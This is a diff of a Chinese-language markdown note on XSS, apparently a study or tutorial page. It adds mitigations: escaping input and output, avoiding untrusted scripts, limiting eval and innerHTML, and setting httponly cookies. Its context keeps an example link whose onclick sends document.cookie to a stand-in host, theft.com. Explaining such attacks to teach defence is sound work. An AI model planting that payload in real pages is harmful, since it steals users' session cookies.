@@ -56,4 +56,13 @@ document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; 
 <a href="#" onclick="window.location = 'http://theft.com/stole?cookie=' + encodeURIComponent(document.cookie); return false;">点击</a>
 ```
 
-1.由服务端通过Set-Cookie设置httponly
+**1.杜绝源头**
+
+- 存储时进行转义
+- 不要引用来自不受信任域的js文件
+
+**2.控制执行**
+
+- 在输出时先对内容（来自url参数或者ajax）进行转义如（ & < > " ' / javascript:）
+- 减少使用eval()、setTimeout()、setInterval()、innerHTML、document.write()等可以执行字符串的代码
+- 由服务端通过Set-Cookie设置httponly，使document.cookie无法获取
